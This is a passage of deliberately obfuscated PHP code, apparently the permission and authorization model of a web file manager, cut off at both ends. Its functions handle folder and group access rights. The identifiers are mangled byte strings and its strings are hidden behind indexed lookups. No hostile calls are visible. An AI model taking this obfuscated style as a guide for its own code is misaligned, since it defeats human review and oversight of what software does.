$æ¢‚†ñ[$å”şè©] = $ıŸ¬Õ‡Ö[$å”şè©]; } } if (count($æ¢‚†ñ) == count($Åæ´‹½×)) { return $îËË´õŞ ? $æ¢‚†ñ[$Åæ´‹½×[0]] : $æ¢‚†ñ; } $’¢ûõÆ = $ığõÌÇ[1916]; $¬ŸÍÁÂÆ = array($ığõÌÇ[407] => array($ığõÌÇ[7], $Åæ´‹½×)); $º³ş¬í = $this->field($’¢ûõÆ)->order($ığõÌÇ[404])->where($¬ŸÍÁÂÆ)->select(); $ÙÓì¯« = array_to_keyvalue_group($º³ş¬í, $ığõÌÇ[407]); foreach ($Åæ´‹½× as $å”şè©) { $ıŸ¬Õ‡Ö[$å”şè©] = $ÙÓì¯«[$å”şè©] ? $ÙÓì¯«[$å”şè©] : array(); } if ($îËË´õŞ) { return $º³ş¬í; } return $ÙÓì¯«; } public function setAuth($œô½“É, $Å©ÏÎÍó) { $×ÅÆùÚ =& $_SERVER[Á÷ ­Šë]; $ã¹˜İñ‚ = Model($×ÅÆùÚ[1249])->sourceInfo($œô½“É); if (!$ã¹˜İñ‚) { return !1; } if ($ã¹˜İñ‚[$×ÅÆùÚ[416]] != SourceModel::TYPE_GROUP) { return !1; } $óÍ×¬µ = 1; $ÖÓ¹í»‚ = $ã¹˜İñ‚[$×ÅÆùÚ[508]]; if ($ÖÓ¹í»‚ != $óÍ×¬µ) { $¤ëÕ€è = array($×ÅÆùÚ[1742] => $ÖÓ¹í»‚); $›§ÑÛ×µ = Model($×ÅÆùÚ[1831])->field($×ÅÆùÚ[1574])->where($¤ëÕ€è)->select(); $›§ÑÛ×µ = array_to_keyvalue($›§ÑÛ×µ, $×ÅÆùÚ[33], $×ÅÆùÚ[1574]); } $†»¾¡Ã = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Í¸™Œé´ = array(); foreach ($Å©ÏÎÍó as $¯Åğ—¿Ò) { if (!in_array($¯Åğ—¿Ò[$×ÅÆùÚ[416]], $†»¾¡Ã)) { show_json(LNG($×ÅÆùÚ[1917]), !1); } if ($ÖÓ¹í»‚ != $óÍ×¬µ) { if ($¯Åğ—¿Ò[$×ÅÆùÚ[416]] == SourceModel::TYPE_GROUP) { } if ($¯Åğ—¿Ò[$×ÅÆùÚ[508]] != 0 && !in_array($¯Åğ—¿Ò[$×ÅÆùÚ[508]], $›§ÑÛ×µ)) { } } if ($¯Åğ—¿Ò[$×ÅÆùÚ[508]] == 0) { $¯Åğ—¿Ò[$×ÅÆùÚ[416]] = SourceModel::TYPE_USER; } $Í¸™Œé´[] = array($×ÅÆùÚ[407] => $œô½“É, $×ÅÆùÚ[416] => intval($¯Åğ—¿Ò[$×ÅÆùÚ[416]]), $×ÅÆùÚ[508] => intval($¯Åğ—¿Ò[$×ÅÆùÚ[508]]), $×ÅÆùÚ[1845] => intval($¯Åğ—¿Ò[$×ÅÆùÚ[1845]]) ? intval($¯Åğ—¿Ò[$×ÅÆùÚ[1845]]) : 0, $×ÅÆùÚ[1899] => intval($¯Åğ—¿Ò[$×ÅÆùÚ[1899]]) ? intval($¯Åğ—¿Ò[$×ÅÆùÚ[1899]]) : -1); } $this->where(array($×ÅÆùÚ[422] => $œô½“É))->delete(); $this->addAll($Í¸™Œé´); return !0; } public function authClear($¶‚¾µñ) { $Ôö¼±´ =& $_SERVER[Á÷ ­Šë]; $ã“Æ „© = Model($Ôö¼±´[1249])->sourceInfo($¶‚¾µñ); $Ù¦•ù³÷ = array($¶‚¾µñ); if ($ã“Æ „©[$Ôö¼±´[415]] == $Ôö¼±´[97]) { $îõ–ıÁ = array($Ôö¼±´[588] => array($Ôö¼±´[548], $ã“Æ „©[$Ôö¼±´[525]] . $¶‚¾µñ . $Ôö¼±´[549])); $Ù¦•ù³÷ = Model($Ôö¼±´[1249])->field($Ôö¼±´[422])->where($îõ–ıÁ)->getField($Ôö¼±´[407], !0); $Ù¦•ù³÷[] = $¶‚¾µñ; } $this->where(array($Ôö¼±´[422] => array($Ôö¼±´[423], $Ù¦•ù³÷)))->delete(); return !0; } public function getAllChildren($« ¹âğĞ) { $ØˆÉì• =& $_SERVER[Á÷ ­Šë]; $Â½úƒğ‘ = Model($ØˆÉì•[1249])->sourceInfo($« ¹âğĞ); if ($Â½úƒğ‘[$ØˆÉì•[415]] != $ØˆÉì•[97]) { return $this->sourceListAuth(array($« ¹âğĞ)); } if ($Â½úƒğ‘[$ØˆÉì•[416]] != SourceModel::TYPE_GROUP) { return array(); } $šÒİ§Õø = 1; $ÍĞÎãâ = array($« ¹âğĞ); if ($Â½úƒğ‘[$ØˆÉì•[502]] == $ØˆÉì•[201] && $Â½úƒğ‘[$ØˆÉì•[508]] != $šÒİ§Õø) { $ÍĞÎãâ = $this->groupChidldAllRootSource($Â½úƒğ‘[$ØˆÉì•[508]]); } $¼€‚ú¹Ê = $this->field($ØˆÉì•[407])->group($ØˆÉì•[407])->select(); $¼€‚ú¹Ê = array_to_keyvalue($¼€‚ú¹Ê, $ØˆÉì•[33], $ØˆÉì•[407]); if (!$¼€‚ú¹Ê) { return array(); } $‹ŞœÒÂ = $ØˆÉì•[1918]; $„íßÕŞØ = array($ØˆÉì•[407] => array($ØˆÉì•[7], $¼€‚ú¹Ê), $ØˆÉì•[435] => $ØˆÉì•[201]); $äİÀÏ„¦ = Model($ØˆÉì•[827])->field($‹ŞœÒÂ)->where($„íßÕŞØ)->select(); $¡Ï½äÆ = array($« ¹âğĞ); foreach ($äİÀÏ„¦ as $éğ¹åÌà) { foreach ($ÍĞÎãâ as $ƒº»«ïÅ) { $ŞÔÂÆ‘ = $ØˆÉì•[47] . $ƒº»«ïÅ . $ØˆÉì•[47]; $°Ş‡Ï“Ë = $éğ¹åÌà[$ØˆÉì•[525]] . $éğ¹åÌà[$ØˆÉì•[407]] . $ØˆÉì•[47]; if (strstr($°Ş‡Ï“Ë, $ŞÔÂÆ‘)) { $¡Ï½äÆ[] = $éğ¹åÌà[$ØˆÉì•[407]]; break; } } } return $this->sourceListAuth($¡Ï½äÆ); } private function sourceListAuth($ø¬Ãíå) { $ã©Ù÷îÆ =& $_SERVER[Á÷ ­Šë]; $‘•€ãØ½ = Model($ã©Ù÷îÆ[1249])->sourceListInfo($ø¬Ãíå, !0); $×Ê»³Š = $this->sourceAuthSelect($ø¬Ãíå); $—©éÑ‡û = array(); $¿¤ĞÍ€§ = array(); foreach ($‘•€ãØ½ as $£Ïè©ó…) { unset($£Ïè©ó…[$ã©Ù÷îÆ[458]]); unset($£Ïè©ó…[$ã©Ù÷îÆ[456]]); unset($£Ïè©ó…[$ã©Ù÷îÆ[418]]); unset($£Ïè©ó…[$ã©Ù÷îÆ[95]]); $ú‡Òü´Ì = $×Ê»³Š[$£Ïè©ó…[$ã©Ù÷îÆ[407]]]; if (!$ú‡Òü´Ì) { continue; } $£Ïè©ó…[$ã©Ù÷îÆ[1919]] = $this->authTargetInfo($ú‡Òü´Ì); $£Ïè©ó…[$ã©Ù÷îÆ[523]] = rtrim($£Ïè©ó…[$ã©Ù÷îÆ[529]], $ã©Ù÷îÆ[8]) . $ã©Ù÷îÆ[8] . ltrim($£Ïè©ó…[$ã©Ù÷îÆ[523]], $ã©Ù÷îÆ[8]); $—©éÑ‡û[] = $£Ïè©ó…; $§÷ Àº = count(explode($ã©Ù÷îÆ[8], trim($£Ïè©ó…[$ã©Ù÷îÆ[523]], $ã©Ù÷îÆ[8]))); $¿¤ĞÍ€§[] = $§÷ Àº + ($£Ïè©ó…[$ã©Ù÷îÆ[29]] == $ã©Ù÷îÆ[87] ? 0 : 1000); } array_multisort($¿¤ĞÍ€§, SORT_ASC, $—©éÑ‡û); return $—©éÑ‡û; } private function groupChidldAllRootSource($›˜›‘ª¸) { $‘…›—Ó” =& $_SERVER[Á÷ ­Šë]; $¥æ™ë»£ = Model($‘…›—Ó”[1920])->groupChildrenAll($›˜›‘ª¸); $Û¯şø£Š = array($‘…›—Ó”[502] => 0, $‘…›—Ó”[508] => array($‘…›—Ó”[7], $¥æ™ë»£), $‘…›—Ó”[416] => SourceModel::TYPE_GROUP); $Îªæ©‡ù = Model($‘…›—Ó”[827])->field($‘…›—Ó”[407])->where($Û¯şø£Š)->select(); $Îªæ©‡ù = array_to_keyvalue($Îªæ©‡ù, $‘…›—Ó”[33], $‘…›—Ó”[407]); return $Îªæ©‡ù; } private function authTargetInfo($ÑËÄı“ ) { $—ùúçÑÄ =& $_SERVER[Á÷ ­Šë]; $©‚¥”°ö = array(); $ÒÊ¶éï³ = array(); $’˜Å ¥“ = 2 << 25; foreach ($ÑËÄı“  as $ï–ˆ’®“) { $³òøŸ§· = Model($—ùúçÑÄ[511])->listData($ï–ˆ’®“[$—ùúçÑÄ[1845]]); if (!$³òøŸ§·) { continue; } if ($ï–ˆ’®“[$—ùúçÑÄ[416]] == SourceModel::TYPE_USER) { $Ÿ×´àÏÆ = Model($—ùúçÑÄ[517])->getInfoSimpleOuter($ï–ˆ’®“[$—ùúçÑÄ[508]]); if ($Ÿ×´àÏÆ[$—ùúçÑÄ[1574]] == $—ùúçÑÄ[1116]) { continue; } if ($Ÿ×´àÏÆ[$—ùúçÑÄ[1574]] == $—ùúçÑÄ[201]) { $Ÿ×´àÏÆ[$—ùúçÑÄ[28]] = LNG($—ùúçÑÄ[1921]); } } else { $Ÿ×´àÏÆ = Model($—ùúçÑÄ[526])->getInfoSimple($ï–ˆ’®“[$—ùúçÑÄ[508]]); } if (!$Ÿ×´àÏÆ) { continue; } $Ÿ×´àÏÆ[$—ùúçÑÄ[470]] = $³òøŸ§·; $©‚¥”°ö[] = $Ÿ×´àÏÆ; $ğéûã¥ = 0; if ($ï–ˆ’®“[$—ùúçÑÄ[416]] == SourceModel::TYPE_GROUP) { $ğéûã¥ = $’˜Å ¥“ * 2; } if ($ï–ˆ’®“[$—ùúçÑÄ[416]] == SourceModel::TYPE_USER) { $ğéûã¥ = $’˜Å ¥“; } if ($ï–ˆ’®“[$—ùúçÑÄ[416]] == SourceModel::TYPE_USER && $ï–ˆ’®“[$—ùúçÑÄ[508]] == $—ùúçÑÄ[201]) { $ğéûã¥ = 0; } $ÒÊ¶éï³[] = $³òøŸ§·[$—ùúçÑÄ[418]] + $ğéûã¥; } array_multisort($ÒÊ¶éï³, SORT_DESC, $©‚¥”°ö); return $©‚¥”°ö; } public function getAllChildrenByUser($ÑÙ–ÆÓµ, $úŸ¹èÌ) { $Ùˆ´´ü® =& $_SERVER[Á÷ ­Šë]; $¸÷«ª™‰ = Model($Ùˆ´´ü®[542])->getInfo($úŸ¹èÌ); if (!$úŸ¹èÌ || !$ÑÙ–ÆÓµ || !$¸÷«ª™‰) { return array(); } $µùê˜çï = Model($Ùˆ´´ü®[1249])->sourceInfo($ÑÙ–ÆÓµ); $Î³”§Œ£ = array(); $À‘ü×àÊ = 1; if ($µùê˜çï[$Ùˆ´´ü®[502]] == $Ùˆ´´ü®[201] && $µùê˜çï[$Ùˆ´´ü®[508]] != $À‘ü×àÊ && $this->groupContainUser($µùê˜çï[$Ùˆ´´ü®[508]], $úŸ¹èÌ)) { foreach ($¸÷«ª™‰[$Ùˆ´´ü®[1922]] as $•£Åç¿) { $¨òü½·³ = Model($Ùˆ´´ü®[526])->getInfo($•£Åç¿[$Ùˆ´´ü®[1742]]); $ñğÊæ‚¯ = Model($Ùˆ´´ü®[542])->getInfoSimpleOuter($úŸ¹èÌ); $ñğÊæ‚¯[$Ùˆ´´ü®[470]] = $•£Åç¿[$Ùˆ´´ü®[418]]; if (Model($Ùˆ´´ü®[511])->authCheckAction($•£Åç¿[$Ùˆ´´ü®[418]][$Ùˆ´´ü®[418]], $Ùˆ´´ü®[1762])) { continue; } $û¾ªØ´ = array($Ùˆ´´ü®[28] => $Ùˆ´´ü®[1523] . $¨òü½·³[$Ùˆ´´ü®[28]], $Ùˆ´´ü®[407] => $¨òü½·³[$Ùˆ´´ü®[95]][$Ùˆ´´ü®[407]], $Ùˆ´´ü®[86] => KodIO::make($¨òü½·³[$Ùˆ´´ü®[95]][$Ùˆ´´ü®[407]]), $Ùˆ´´ü®[502] => $Ùˆ´´ü®[201], $Ùˆ´´ü®[416] => $Ùˆ´´ü®[519], $Ùˆ´´ü®[29] => $Ùˆ´´ü®[552], $Ùˆ´´ü®[523] => $¨òü½·³[$Ùˆ´´ü®[530]], $Ùˆ´´ü®[1742] => $¨òü½·³[$Ùˆ´´ü®[1742]], $Ùˆ´´ü®[527] => $¨òü½·³[$Ùˆ´´ü®[502]], $Ùˆ´´ü®[1919] => array($ñğÊæ‚¯)); $Î³”§Œ£[$û¾ªØ´[$Ùˆ´´ü®[407]]] = $û¾ªØ´; } } $­ºÏ¦Î = array(); $õ§ó÷ÂÜ = $this->getAllChildren($ÑÙ–ÆÓµ); foreach ($õ§ó÷ÂÜ as $Æ¨·úß) { $Šúü ¥Í = !1; foreach ($Æ¨·úß[$Ùˆ´´ü®[1919]] as $‰ñ•¶ûı) { if ($‰ñ•¶ûı[$Ùˆ´´ü®[1574]]) { if ($‰ñ•¶ûı[$Ùˆ´´ü®[1574]] == $úŸ¹èÌ) { $Šúü ¥Í = !0; break; } } if ($‰ñ•¶ûı[$Ùˆ´´ü®[1742]]) { if ($this->groupContainUser($‰ñ•¶ûı[$Ùˆ´´ü®[1742]], $úŸ¹èÌ)) { $Šúü ¥Í = !0; break; } } } if ($Šúü ¥Í) { $­ºÏ¦Î[] = $Æ¨·úß; } $×¾Ò¯’« = $Æ¨·úß[$Ùˆ´´ü®[407]]; if (isset($Î³”§Œ£[$×¾Ò¯’«])) { $Æ¨·úß[$Ùˆ´´ü®[1919]][] = $Î³”§Œ£[$×¾Ò¯’«][0]; $Î³”§Œ£[$×¾Ò¯’«] = !1; } } $Î³”§Œ£ = array_filter(array_values($Î³”§Œ£)); $­ºÏ¦Î = array_merge($Î³”§Œ£, $­ºÏ¦Î); return $­ºÏ¦Î; } public function setAllChildrenByUser($èÖÑ‰»Ô, $Øø®ïÎ», $á˜¿Ù¾) { $³ÑœıÀ§ =& $_SERVER[Á÷ ­Šë]; $îšŸ½Ã = $this->getAllChildrenByUser($èÖÑ‰»Ô, $Øø®ïÎ»); if (!$á˜¿Ù¾ || !$îšŸ½Ã) { return !1; } foreach ($îšŸ½Ã as $í¢í‚Â) { $Ø¸óïÜ™ = array(); foreach ($í¢í‚Â[$³ÑœıÀ§[1919]] as $Ì”İãÖ) { $‚ô®ÊÂ = $Ì”İãÖ[$³ÑœıÀ§[470]]; $ì¿°ÀÆé = $Ì”İãÖ[$³ÑœıÀ§[1574]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¤‡ûıÔ = $Ì”İãÖ[$³ÑœıÀ§[1574]] ? $Ì”İãÖ[$³ÑœıÀ§[1574]] : $Ì”İãÖ[$³ÑœıÀ§[1742]]; if ($Ì”İãÖ[$³ÑœıÀ§[1574]] && $Ì”İãÖ[$³ÑœıÀ§[1574]] == $Øø®ïÎ») { continue; } $Ø¸óïÜ™[] = array($³ÑœıÀ§[407] => $í¢í‚Â[$³ÑœıÀ§[407]], $³ÑœıÀ§[416] => $ì¿°ÀÆé, $³ÑœıÀ§[508] => intval($¤‡ûıÔ), $³ÑœıÀ§[1845] => isset($‚ô®ÊÂ[$³ÑœıÀ§[404]]) ? intval($‚ô®ÊÂ[$³ÑœıÀ§[404]]) : 0, $³ÑœıÀ§[1899] => isset($‚ô®ÊÂ[$³ÑœıÀ§[1899]]) ? intval($‚ô®ÊÂ[$³ÑœıÀ§[1899]]) : -1); } $Ø¸óïÜ™[] = array($³ÑœıÀ§[407] => $í¢í‚Â[$³ÑœıÀ§[407]], $³ÑœıÀ§[416] => SourceModel::TYPE_USER, $³ÑœıÀ§[508] => intval($Øø®ïÎ»), $³ÑœıÀ§[1845] => intval($á˜¿Ù¾), $³ÑœıÀ§[1899] => -1); $this->where(array($³ÑœıÀ§[422] => $í¢í‚Â[$³ÑœıÀ§[407]]))->delete(); $this->addAll($Ø¸óïÜ™); } return !0; } public function get($îá¸¡Øâ) { $Ï¡Ìœıˆ = $this->getSourceList(array($îá¸¡Øâ), !0); return $Ï¡Ìœıˆ[0]; } public function getSourceList($€“ïœĞ, $‚ûŸ¹¦ä = false, $ëÃü‚Ø‹ = false) { $€¼àé° =& $_SERVER[Á÷ ­Šë]; if (!$€“ïœĞ) { return array(); } $µŠÌİİ = Model($€¼àé°[1249]); if (!$‚ûŸ¹¦ä && count($€“ïœĞ) == 1) { $‚ûŸ¹¦ä = array(); $‚ûŸ¹¦ä[$€“ïœĞ[0]] = $µŠÌİİ->sourceInfo($€“ïœĞ[0]); } if (!$‚ûŸ¹¦ä) { $ã×Î×î‚ = array($€¼àé°[422] => array($€¼àé°[423], $€“ïœĞ)); $‚ûŸ¹¦ä = $µŠÌİİ->field($€¼àé°[1923])->where($ã×Î×î‚)->select(); $‚ûŸ¹¦ä = array_to_keyvalue($‚ûŸ¹¦ä, $€¼àé°[407]); } $ÚÉŞÅÑ¸ = $€“ïœĞ; foreach ($‚ûŸ¹¦ä as $Üı–´Ø€ => $ñ›°çøÄ) { $î”—¥©‡ = $µŠÌİİ->parentLevelArray($ñ›°çøÄ[$€¼àé°[525]]); $ÚÉŞÅÑ¸ = array_merge($ÚÉŞÅÑ¸, array($Üı–´Ø€), array_reverse($î”—¥©‡)); } $ÚÉŞÅÑ¸ = array_values(array_unique($ÚÉŞÅÑ¸)); if (!$ÚÉŞÅÑ¸) { return array(); } $¨İÛÀÑš = $this->sourceAuthSelect($ÚÉŞÅÑ¸); $ÄâõöÛ = array(); foreach ($ÚÉŞÅÑ¸ as $ßàÇù“¸) { if (isset($¨İÛÀÑš[$ßàÇù“¸])) { $ÄâõöÛ[$ßàÇù“¸] = $¨İÛÀÑš[$ßàÇù“¸]; } } $åÑˆÀù³ = $this->userIsRoot($ëÃü‚Ø‹); $Á„£§Ë² = AuthModel::authAll(); $­•ìêçÁ = array($€¼àé°[419] => $Á„£§Ë², $€¼àé°[1924] => array($€¼àé°[424] => 0, $€¼àé°[1748] => $Á„£§Ë², $€¼àé°[425] => LNG($€¼àé°[1925]), $€¼àé°[1764] => $€¼àé°[1926])); $Ã‡Î…„ = array(); foreach ($‚ûŸ¹¦ä as $ßàÇù“¸ => $™Øñ”¹¯) { if ($åÑˆÀù³) { $Ã‡Î…„[$ßàÇù“¸] = $­•ìêçÁ; continue; } $Ã‡Î…„[$ßàÇù“¸] = $this->makeSourceAuth($™Øñ”¹¯, $ÄâõöÛ, $ëÃü‚Ø‹); } return $Ã‡Î…„; } public function authDeepCheck($ÅÀøÆ“À, $Î´˜ëÛ¶ = false) { $ÑÉµ†÷ò =& $_SERVER[Á÷ ­Šë]; $Î´˜ëÛ¶ = $Î´˜ëÛ¶ ? $Î´˜ëÛ¶ : USER_ID; $‘ñ›ØÉ• = $this->makeAuthDeep($Î´˜ëÛ¶); if (!in_array($ÅÀøÆ“À, $‘ñ›ØÉ•[$ÑÉµ†÷ò[1927]])) { return !1; } $³°Øæ†Š = array(); foreach ($‘ñ›ØÉ•[$ÑÉµ†÷ò[1928]] as $ë¬ÖÚ˜¼ => $š¾Æª‚˜) { if (!in_array($ÅÀøÆ“À, $š¾Æª‚˜)) { continue; } $³°Øæ†Š[] = $ë¬ÖÚ˜¼; } if (!$³°Øæ†Š) { return !1; } $éÓüæÄÂ = $³°Øæ†Š ? $³°Øæ†Š[0] : $ÅÀøÆ“À; return array($ÑÉµ†÷ò[419] => -1, $ÑÉµ†÷ò[470] => array($ÑÉµ†÷ò[424] => $ÑÉµ†÷ò[1116], $ÑÉµ†÷ò[1748] => $ÑÉµ†÷ò[201], $ÑÉµ†÷ò[425] => LNG($ÑÉµ†÷ò[1929]), $ÑÉµ†÷ò[1764] => $ÑÉµ†÷ò[1930]), $ÑÉµ†÷ò[1931] => LNG($ÑÉµ†÷ò[1932]), $ÑÉµ†÷ò[1933] => $this->sourceAuthInfo($éÓüæÄÂ)); } protected function makeAuthDeep($à¸Œá›ï = false) { $ÃùÕ²Š« =& $_SERVER[Á÷ ­Šë]; static $ã¤ã®ó÷ = array(); $à¸Œá›ï = $à¸Œá›ï ? $à¸Œá›ï : USER_ID; if (isset($ã¤ã®ó÷[$à¸Œá›ï])) { return $ã¤ã®ó÷[$à¸Œá›ï]; } $¿ÜşêÈÉ = Model($ÃùÕ²Š«[1934])->listData(); $Ğ‰‡­ƒæ = array(); foreach ($¿ÜşêÈÉ as $Àº‡İ¦·) { if ($Àº‡İ¦·[$ÃùÕ²Š«[418]] == 0 && $Àº‡İ¦·[$ÃùÕ²Š«[1763]] == $ÃùÕ²Š«[97]) { $Ğ‰‡­ƒæ[] = $Àº‡İ¦·[$ÃùÕ²Š«[404]]; } } $˜½ÈÍ¢° = $this->userGroupParents($à¸Œá›ï); $ê‘Ñ×—î = array($ÃùÕ²Š«[416] => SourceModel::TYPE_USER, $ÃùÕ²Š«[508] => $à¸Œá›ï); if ($˜½ÈÍ¢°) { $ê‘Ñ×—î = array(array($ÃùÕ²Š«[416] => SourceModel::TYPE_USER, $ÃùÕ²Š«[508] => $à¸Œá›ï), array($ÃùÕ²Š«[416] => SourceModel::TYPE_GROUP, $ÃùÕ²Š«[508] => array($ÃùÕ²Š«[423], $˜½ÈÍ¢°)), $ÃùÕ²Š«[992] => $ÃùÕ²Š«[1837]); } $•©€‚“Û = $this->field($ÃùÕ²Š«[1935])->where($ê‘Ñ×—î)->select(); $ä Á¸‡Ä = array(); $•Ù¬‡ùÜ = array_to_keyvalue_group($•©€‚“Û, $ÃùÕ²Š«[407]); foreach ($•Ù¬‡ùÜ as $¡ÈÓ×Ş => $âƒ‡˜öø) { $Šº¯ŒÊ´ = $this->authArrayCheck($âƒ‡˜öø, $à¸Œá›ï); if ($Šº¯ŒÊ´[$ÃùÕ²Š«[419]] > 0) { $ä Á¸‡Ä[] = $¡ÈÓ×Ş . $ÃùÕ²Š«[33]; } } $Ã ó˜Û = array(); $¾ÖîÉâ® = $˜½ÈÍ¢°; $£ÛÒÎ = Model($ÃùÕ²Š«[1249]); $çÊ˜…Ä = Model($ÃùÕ²Š«[526]); $õÜ¥½ÚÚ = array(); $ìò­·óó = array(); $µì©Îïï = array(); $Ç ÙÇˆ = array(); if ($ä Á¸‡Ä) { $ÙèÀªÕ = $£ÛÒÎ->where(array($ÃùÕ²Š«[407] => array($ÃùÕ²Š«[423], $ä Á¸‡Ä)))->select(); foreach ($ÙèÀªÕ as $æàç¼¼) { $Ï¹Ç³Ï’ = $£ÛÒÎ->parentLevelArray($æàç¼¼[$ÃùÕ²Š«[525]]); $Ã ó˜Û = array_merge($Ã ó˜Û, $Ï¹Ç³Ï’); $¾ÖîÉâ®[] = $æàç¼¼[$ÃùÕ²Š«[508]]; $õÜ¥½ÚÚ[$æàç¼¼[$ÃùÕ²Š«[407]]] = $Ï¹Ç³Ï’; $ìò­·óó[$æàç¼¼[$ÃùÕ²Š«[407]]] = $æàç¼¼[$ÃùÕ²Š«[508]]; } } $¾ÖîÉâ® = array_values(array_unique($¾ÖîÉâ®)); $§Ö¨ˆë© = $¾ÖîÉâ®; foreach ($§Ö¨ˆë© as $¥¸Š¹ñ¬) { $ÎìÖış­ = $çÊ˜…Ä->getInfo($¥¸Š¹ñ¬); $Ï¹Ç³Ï’ = $£ÛÒÎ->parentLevelArray($ÎìÖış­[$ÃùÕ²Š«[525]]); $¾ÖîÉâ® = array_merge($¾ÖîÉâ®, $Ï¹Ç³Ï’); } $¾ÖîÉâ® = array_values(array_unique($¾ÖîÉâ®)); foreach ($¾ÖîÉâ® as $¥¸Š¹ñ¬) { $ÎìÖış­ = $çÊ˜…Ä->getInfo($¥¸Š¹ñ¬); $Ã ó˜Û[] = $ÎìÖış­[$ÃùÕ²Š«[95]][$ÃùÕ²Š«[407]]; $µì©Îïï[$¥¸Š¹ñ¬] = $ÎìÖış­[$ÃùÕ²Š«[95]][$ÃùÕ²Š«[407]]; $Ç ÙÇˆ[$¥¸Š¹ñ¬] = $£ÛÒÎ->parentLevelArray($ÎìÖış­[$ÃùÕ²Š«[525]]); } foreach ($õÜ¥½ÚÚ as $™êª¯×„ => $‘¶şä¿ú) { $«½Øëã = $ìò­·óó[$™êª¯×„]; if (!$«½Øëã || !$µì©Îïï[$«½Øëã]) { continue; } $ó’Ë½Ó¹ = array(); foreach ($Ç ÙÇˆ[$«½Øëã] as $¥¸Š¹ñ¬) { $ó’Ë½Ó¹[] = $µì©Îïï[$¥¸Š¹ñ¬]; } $õÜ¥½ÚÚ[$™êª¯×„] = array_merge($ó’Ë½Ó¹, $‘¶şä¿ú); } $Ã ó˜Û = array_values(array_unique($Ã ó˜Û)); $…®ÍƒŒ = array($ÃùÕ²Š«[1927] => $Ã ó˜Û, $ÃùÕ²Š«[1928] => $õÜ¥½ÚÚ); $ã¤ã®ó÷[$à¸Œá›ï] = $…®ÍƒŒ; return $…®ÍƒŒ; } private function makeSourceAuth($ä ŞáÛã, $ÅùÕîÈ, $€ÓˆËçß = false) { $Áø›œù„ =& $_SERVER[Á÷ ­Šë]; $èßá¨Æ­ = $Áø›œù„[97]; $§à×ßöé = $ä ŞáÛã[$Áø›œù„[508]]; $œœË ±¸ = $ä ŞáÛã[$Áø›œù„[416]] == SourceModel::TYPE_GROUP; $çêê•ÈÂ = $œœË ±¸ ? $this->groupRootAuth($§à×ßöé, $€ÓˆËçß) : !1; if ($çêê•ÈÂ && Model($Áø›œù„[511])->authCheckAction($çêê•ÈÂ[$Áø›œù„[418]], $Áø›œù„[1762])) { return $this->groupAuthInfo($çêê•ÈÂ, $§à×ßöé); } $ËÜÁãÇ = Model($Áø›œù„[1249])->parentLevelArray($ä ŞáÛã[$Áø›œù„[525]]); $ËÜÁãÇ = array_merge(array($ä ŞáÛã[$Áø›œù„[407]]), array_reverse($ËÜÁãÇ)); $ÄÒˆ•³¦ = !1; foreach ($ËÜÁãÇ as $ËƒòØ£) { if (!isset($ÅùÕîÈ[$ËƒòØ£])) { continue; } $ĞÜşºãŸ = $this->authMake($ÅùÕîÈ[$ËƒòØ£], $€ÓˆËçß); if ($ĞÜşºãŸ[$Áø›œù„[470]]) { $ÄÒˆ•³¦ = $ĞÜşºãŸ; break; } } if (!$œœË ±¸) { return $ÄÒˆ•³¦; } if (!$ÄÒˆ•³¦ && $çêê•ÈÂ) { $ÄÒˆ•³¦ = $this->groupAuthInfo($çêê•ÈÂ, $§à×ßöé); } if (!$ÄÒˆ•³¦) { $ºò°¶óë = Model($Áø›œù„[526])->getInfo($§à×ßöé); $ß´·èÔİ = explode($Áø›œù„[47], trim($ºò°¶óë[$Áø›œù„[525]], $Áø›œù„[47])); $ß´·èÔİ = array_reverse($ß´·èÔİ); foreach ($ß´·èÔİ as $ê¥Íâé) { if ($ê¥Íâé == $Áø›œù„[201] || $ê¥Íâé == $èßá¨Æ­) { continue; } $µŠçµÚÀ = $this->groupRootAuth($ê¥Íâé, $€ÓˆËçß); if (!$µŠçµÚÀ) { continue; } $ÄÒˆ•³¦ = $this->groupAuthInfo($µŠçµÚÀ, $ê¥Íâé); break; } } if (!$ÄÒˆ•³¦ || $ÄÒˆ•³¦[$Áø›œù„[419]] <= 0) { $‚¹–Æˆ¬ = $this->authDeepCheck($ä ŞáÛã[$Áø›œù„[407]], $€ÓˆËçß); if ($‚¹–Æˆ¬) { $ÄÒˆ•³¦ = $‚¹–Æˆ¬; } } return $ÄÒˆ•³¦; } private function userIsRoot($™ö—üí = false) { $÷¢øé¿Ñ =& $_SERVER[Á÷ ­Šë]; if (!$™ö—üí && _get($GLOBALS, $÷¢øé¿Ñ[509])) { return !0; } $ò˜ÖçÆ‰ = Model($÷¢øé¿Ñ[542])->getInfo($™ö—üí); $è÷¡Š”£ = Model($÷¢øé¿Ñ[1936])->listData($ò˜ÖçÆ‰[$÷¢øé¿Ñ[1454]]); if ($è÷¡Š”£ && $è÷¡Š”£[$÷¢øé¿Ñ[515]][$÷¢øé¿Ñ[1937]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ç¶©„Üš) { $ËÇ™‹ú =& $_SERVER[Á÷ ­Šë]; $–‹³¶¼š = Model($ËÇ™‹ú[1249]); $›æ«ôÚã = $–‹³¶¼š->sourceInfo($Ç¶©„Üš); if (!$›æ«ôÚã) { return !1; } $–‹³¶¼š->groupPathDisplay($›æ«ôÚã); $òÍñş· = array($›æ«ôÚã); $òÍñş· = $–‹³¶¼š->_listAppendPath($òÍñş·); $›æ«ôÚã = $òÍñş·[0]; $ªü”Ó©™ = $›æ«ôÚã[$ËÇ™‹ú[523]]; if (isset($›æ«ôÚã[$ËÇ™‹ú[531]])) { $ÓÍ¡™ø‡ = explode($ËÇ™‹ú[8], trim($›æ«ôÚã[$ËÇ™‹ú[523]], $ËÇ™‹ú[8])); array_shift($ÓÍ¡™ø‡); $ªü”Ó©™ = $›æ«ôÚã[$ËÇ™‹ú[529]] . $ËÇ™‹ú[1938] . implode($ËÇ™‹ú[8], $ÓÍ¡™ø‡); } return array($ËÇ™‹ú[425] => $›æ«ôÚã[$ËÇ™‹ú[28]], $ËÇ™‹ú[86] => KodIO::make($›æ«ôÚã[$ËÇ™‹ú[407]]), $ËÇ™‹ú[1939] => $ªü”Ó©™); } private function groupAuthInfo($«ÃÔóÀ, $”­®Ã¤) { $ŒƒÃ¤‰ =& $_SERVER[Á÷ ­Šë]; $şÒ‹¥ÀÁ = Model($ŒƒÃ¤‰[526])->getInfo($”­®Ã¤); return array($ŒƒÃ¤‰[1940] => intval($«ÃÔóÀ[$ŒƒÃ¤‰[418]]), $ŒƒÃ¤‰[1924] => $«ÃÔóÀ, $ŒƒÃ¤‰[1941] => LNG($ŒƒÃ¤‰[1942]), 